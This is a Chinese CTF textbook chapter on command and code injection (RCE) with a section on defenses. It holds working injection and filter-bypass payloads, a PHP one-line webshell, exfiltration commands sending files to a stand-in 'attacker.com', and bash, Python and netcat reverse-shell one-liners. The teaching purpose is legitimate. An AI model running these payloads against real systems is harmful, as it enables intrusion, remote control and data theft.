# 第 9 章 命令执行与代码执行（RCE）

## 本章目标

读完这一章，你将能够：

- 理解命令执行（Command Injection）与代码执行（Code Injection）的区别
- 掌握常见命令拼接符与绕过过滤的手法
- 理解 eval 等函数导致的代码执行漏洞
- 用 CTF 常见 payload 读取 flag
- 知道如何防御 RCE 漏洞
- 对第二卷 Web 基础漏洞做一次系统回顾

> ⚠️ **法律红线**：本章的命令执行、反弹 shell、webshell 等高危操作，只能在自建靶场或书面授权环境中练习。切勿对任何真实站点或未授权系统使用，否则涉嫌违法。

> RCE（Remote Code Execution，远程代码执行）是危害最高的漏洞类型——攻击者能直接在服务器上执行代码/命令，等于拿到了服务器的"遥控器"。这一章收尾第二卷，学完你就掌握了 Web 方向最核心的几类漏洞。

---

## 9.1 两类 RCE：命令执行 vs 代码执行

这两个概念容易混淆，先分清：

| 类型 | 英文 | 执行的是什么 | 典型函数 |
|------|------|-------------|---------|
| **命令执行** | Command Injection | **操作系统命令**（如 `cat`、`whoami`） | `system()`、`exec()`、`shell_exec()`、`popen()` |
| **代码执行** | Code Injection | **编程语言代码**（如 PHP 代码） | `eval()`、`assert()`、`preg_replace(/e)` |

**类比**：
- 命令执行 = 骗取"服务员"帮你去系统里敲命令（敲 `cat /flag`）
- 代码执行 = 骗取"编译器"把你的字符串当成程序代码运行（运行 `phpinfo()`）

两者目标一致——让服务器执行攻击者指定的东西——只是"语言"不同。CTF 里都常见。

---

## 9.2 命令执行：拼上系统命令

### 9.2.1 漏洞怎么产生

当程序把用户输入**拼进系统命令**时，攻击者用命令连接符追加自己的命令：

```php
<?php
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);   // 把用户输入拼进 ping 命令
?>
```

正常输入 `ip=127.0.0.1`，执行 `ping -c 3 127.0.0.1`。

但输入 `ip=127.0.0.1; cat /flag`，命令变成：

```bash
ping -c 3 127.0.0.1; cat /flag
```

分号 `;` 让 shell 在执行完 ping 后继续执行 `cat /flag`——flag 就显示出来了。

### 9.2.2 命令连接符

| 符号 | 含义 | 示例 |
|------|------|------|
| `;` | 依次执行（无条件） | `cmd1; cmd2` |
| `&&` | 前一个成功才执行后一个 | `cmd1 && cmd2` |
| `\|\|` | 前一个失败才执行后一个 | `cmd1 \|\| cmd2` |
| `&` | 后台执行 / 分隔 | `cmd1 & cmd2` |
| `\|` | 管道，前一个输出给后一个 | `cmd1 \| cmd2` |
| 换行 `%0a` | URL 编码的换行，分隔命令 | `cmd1%0acmd2` |
| 反引号 `` ` `` | 命令替换 | `` `cat /flag` `` |
| `$()` | 命令替换（现代写法） | `$(cat /flag)` |

**CTF 常用 payload**（假设注入点是 ping 的 ip 参数）：

```
127.0.0.1; cat /flag
127.0.0.1 && whoami
127.0.0.1 | ls /
$(cat /flag)
`cat /flag`
```

### 9.2.3 常见命令目标

拿到命令执行后，CTF 里通常这样找 flag：

```bash
whoami                    # 确认当前用户
ls /                      # 看根目录，找 flag 文件
ls -la /var/www/html      # 看网站目录
find / -name "flag*" 2>/dev/null   # 全盘搜索 flag 文件
cat /flag                 # 读取 flag
env                       # 看环境变量（flag 有时在这）
```

## 9.3 过滤绕过

出题人常过滤危险字符（如 `;`、`cat`、空格）。绕过手法：

### 9.3.1 过滤命令连接符

```
用 %0a（换行）代替 ;     → 127.0.0.1%0acat /flag
用 && / || 代替 ;
用管道 |
```

### 9.3.2 过滤空格

```
${IFS}          → cat${IFS}/flag
$IFS$9          → cat$IFS$9/flag
<               → cat</flag
%09（Tab）      → cat%09/flag
```

`${IFS}` 是 shell 的内部字段分隔符（默认含空格），能替代空格。

### 9.3.3 过滤 cat 等命令

```
tac /flag          # 反向显示
more /flag
less /flag
head /flag
tail /flag
nl /flag           # 带行号显示
od -c /flag
grep '' /flag
```

或者用通配符/变量拼接：

```
c${IFS}at /flag
ca? /flag          # ? 匹配单字符
cat /fla*          # * 匹配多个字符
```

### 9.3.4 过滤关键词（如 flag）

```
cat /fla\g         # 反斜杠转义
cat /fla''g        # 空字符串拼接
cat /f???          # 通配符
```

**核心思路**：过滤总是"具体"的（过滤某个字符/词），而绕过是"找等价替代"——换符号、换命令、加编码、加转义。这是和 XSS 绕过一样的思路模式。

## 9.4 代码执行：eval 的威力

### 9.4.1 eval 漏洞

PHP 的 `eval()` 函数把字符串当 PHP 代码执行。如果把用户输入传给它：

```php
<?php
$code = $_GET['code'];
eval($code);   // 危险！用户输入被当 PHP 代码执行
?>
```

访问 `?code=phpinfo();` → 执行 `phpinfo()`，泄露服务器信息。

访问 `?code=system('cat /flag');` → 执行系统命令读 flag（代码执行升级为命令执行）。

**CTF 常见 payload**：

```
?code=phpinfo();
?code=system('cat /flag');
?code=print_r(scandir('/'));    // 列目录
?code=file_get_contents('/flag'); // 读文件
?code=assert($_POST['x']);      // 配合 POST 用蚁剑/菜刀连接
```

### 9.4.2 其他危险函数

| 函数 | 作用 |
|------|------|
| `eval()` | 执行字符串为 PHP 代码 |
| `assert()` | 把参数当代码执行（老版本） |
| `preg_replace()` + `/e` | 正则替换时执行代码（PHP 5.x） |
| `create_function()` | 创建匿名函数时执行代码 |
| `${...}` 动态函数 | `$f('cat /flag')` 其中 `$f=$_GET['f']` |

**一句话 Webshell**：很多一句话木马就是基于 eval/assert：

```php
<?php @eval($_POST['cmd']); ?>
```

用"蚁剑/菜刀/哥斯拉"等工具连接它，就能图形化管理服务器。这在文件上传题里经常配合 WebShell 使用（第 8 章）。

## 9.5 综合实战：一道 RCE 题的完整思路

假设给你一个页面，有个输入框让你"输入 IP 做 ping 测试"：

**① 观察**：输入 `127.0.0.1`，返回 ping 结果。说明服务器把输入拼进了 ping 命令。

**② 假设**：可能存在命令注入。

**③ 验证**：

```
输入 127.0.0.1; whoami
→ 页面在 ping 结果后显示了 www-data（当前用户）→ 注入成功！
```

**④ 深入**：

```
127.0.0.1; ls /          → 看到根目录下有 flag 文件
127.0.0.1; cat /flag     → 拿到 flag
```

**⑤ 若被过滤**：如果 `;` 被过滤，换 `%0a`；如果 `cat` 被过滤，换 `tac`；如果空格被过滤，换 `${IFS}`。逐个尝试，观察哪个有效。

这就是 RCE 题的标准流程。核心是：**确认注入点 → 用连接符追加命令 → 读 flag → 遇过滤则绕过**。

## 9.6 RCE 的防御

| 措施 | 说明 |
|------|------|
| **避免调用系统命令** | 用语言原生 API 替代（如用 `gethostbyname` 代替 `ping`） |
| **白名单校验** | 输入必须是预期格式（如 IP 必须匹配 IP 正则） |
| **escapeshellarg / escapeshellcmd** | 对传入 shell 的参数转义 |
| **禁用危险函数** | php.ini 里禁用 eval/system/exec 等（但 eval 无法完全禁用所有场景） |
| **最小权限** | Web 服务用低权限用户运行，限制命令执行范围 |
| **避免 eval** | 永远不要把用户输入传给 eval |

**根本原则**：**永远不要信任用户输入，永远不要把用户输入拼进命令/代码。** 用白名单、用参数化、用原生 API。

## 9.6 深度拓展：RCE 的绕过艺术与无回显利用

9.1–9.6 覆盖了基础 RCE。这一节补充进阶内容——CTF 里 RCE 题的花样，大多在"过滤绕过"和"无回显"上。

### 9.6.1 PHP 命令执行函数全览

不同函数有细微差别，了解它们有助于绕过：

| 函数 | 特点 | 是否回显 |
|------|------|---------|
| `system()` | 执行命令并输出结果 | 直接输出 |
| `exec()` | 执行命令，输出最后一行 | 需 echo 才有回显 |
| `shell_exec()` | 执行命令，返回全部输出为字符串 | 需 echo |
| `passthru()` | 执行命令，直接输出原始二进制 | 直接输出 |
| `popen()` / `proc_open()` | 建立进程管道，读写流 | 需手动读 |
| `pcntl_exec()` | 替换当前进程（需 pcntl 扩展） | 无 |

**CTF 意义**：如果 `system` 被禁，试试 `exec`、`shell_exec`、`passthru`、`popen`——出题人的黑名单往往列不全。

### 9.6.2 无参数 RCE

有些题过滤了括号里的所有参数（如禁止任何字母），只用函数调用。经典手法：

```php
# 无参数函数链（PHP）
system(current(get_defined_vars()));    # 从全局变量里拿命令
# 或
system(end(get_defined_vars()));
```

原理：`get_defined_vars()` 返回所有变量（含 `$_GET`），配合 `current`/`end`/`next` 等指针函数取出我们控制的请求参数。这样绕过"函数不能带字符串参数"的过滤。

还有利用 `scandir()`、`readfile()`、`file_get_contents()` 组合，通过 `getenv()`、`localeconv()` 等无参函数获取字符的巧妙 chain。这类题是 CTF 里"炫技"型 RCE，需要积累 payload 模式。

### 9.6.3 无回显 RCE：数据外带

如果命令执行了但页面不显示结果（无回显），要把结果"带出来"：

**方法一：HTTP 外带**

```bash
# 把 flag 拼进 URL 请求攻击者的服务器
curl "http://attacker.com/?x=$(cat /flag)"

# 或用 wget
wget "http://attacker.com/$(cat /flag)"
```

攻击者在自己服务器看访问日志，URL 里就带着 flag。

**方法二：DNS 外带**

```bash
# 把 flag 作为子域名做 DNS 查询
nslookup "$(cat /flag).attacker.com"
```

即使服务器不能发 HTTP，DNS 查询通常能出去。攻击者看 DNS 日志得到 flag。

**方法三：延时盲注式判断**

```bash
# 如果 flag 第一个字符是 f，延时 5 秒
[ $(cut -c1 /flag) = f ] && sleep 5
```

通过响应时间一位位猜 flag（类似 SQL 时间盲注，第 6.7 节）。

### 9.6.4 反弹 Shell

拿到命令执行后，如果目标不能直连，可以"反弹 shell"——让目标主动连到你的服务器，获得交互式命令行：

```bash
# 攻击机先监听
nc -lvnp 4444

# 目标机执行（在 RCE 点）
bash -i >& /dev/tcp/攻击机IP/4444 0>&1
```

这行命令把目标的 bash 输入输出重定向到攻击机的 TCP 连接。CTF 里有时需要反弹 shell 才能进一步操作（如找 flag 需要交互）。

**变体**（当 `/dev/tcp` 不可用时）：

```bash
# Python 反弹
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# nc 反弹
nc -e /bin/sh 攻击机IP 4444
```

### 9.6.5 常见过滤的完整绕过清单

把前面零散的绕过技巧系统整理成一张表：

| 被过滤 | 绕过方法 |
|--------|---------|
| 空格 | `${IFS}`、`$IFS$9`、`<`、`%09`、`{cat,/flag}` |
| `cat` | `tac`/`head`/`tail`/`nl`/`more`/`less`/`od`/`grep ''` |
| `/` | `${PATH:0:1}`、`$(printf '\57')`、通配符 `/*` |
| `;` `&` `\|` | `%0a`（换行）、`%0d`、直接空格+`&&` |
| 关键词 `flag` | `fla\g`、`fl''ag`、`f???`、`$(echo ZmxhZw==\|base64 -d)` |
| 括号 `()` | 用反引号 `` ` ``、或无参函数链 |
| 字母数字 | 用 Python 构造字符、变量拼接、`$(( ))` 算术 |

**核心思路总结**：
1. **等价替换**：换个功能相同的命令/符号
2. **编码变形**：Base64/Hex/URL 编码后动态解码执行
3. **拼接组合**：把被过滤的词拆成几段再拼
4. **通配符**：用 `*` `?` 匹配文件名
5. **无参构造**：从环境变量/全局变量里"借"字符

这套思路和 XSS、SQL 注入的绕过完全同源——**过滤是具体的，绕过是找语义等价的另一种写法**。掌握这个思维模式，任何过滤题都能从容应对。

## 9.7 第二卷总结：Web 基础漏洞全景

学完第 4–9 章，你已经掌握了 Web 安全最核心的几类漏洞。回顾一下：

| 章节 | 漏洞 | 本质 | 核心防御 |
|------|------|------|---------|
| 4 | HTTP 基础 | 请求的各部分都可能被操控 | 理解通信 |
| 5 | 信息收集 | 线索藏在角落 | 隐藏敏感信息 |
| 6 | SQL 注入 | 输入被当 SQL 指令 | 参数化查询 |
| 7 | XSS | 输入被当 JS 执行 | 输出编码 + HttpOnly |
| 8 | 文件上传 | 服务器存并执行恶意文件 | 白名单 + 重命名 |
| 9 | RCE | 输入被当命令/代码执行 | 避免调用命令 + 白名单 |

**贯穿始终的心法**：

1. **一切漏洞源于"信任了不该信任的输入"**——用户输入、请求头、上传文件，都不可信。
2. **"数据与指令分离"是根本防御**——SQL 注入用参数化，命令注入用白名单，XSS 用输出编码，本质都是不让数据变成指令。
3. **攻防一体**——每学一个攻击，都问"怎么防"。理解防御，攻击才通透。

这些基础上第三卷的进阶漏洞（SSRF、反序列化、JWT、SSTI、XXE、逻辑漏洞）都是在"用户输入被信任"这个大框架下的不同变体。基础扎实，进阶就容易了。

## 9.8 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| 两类 RCE | 命令执行（system 等）+ 代码执行（eval 等） |
| 连接符 | `;`、`&&`、`\|\|`、`\|`、%0a、`$()`、反引号 |
| 绕过 | 空格用 `${IFS}`；cat 换 tac/more/head；通配符 |
| eval 漏洞 | `?code=system('cat /flag')`；一句话木马 `@eval($_POST['cmd'])` |
| 找 flag | whoami → ls / → find / -name flag* → cat /flag |
| 防御 | 避免系统调用 + 白名单 + 转义 + 禁用危险函数 |
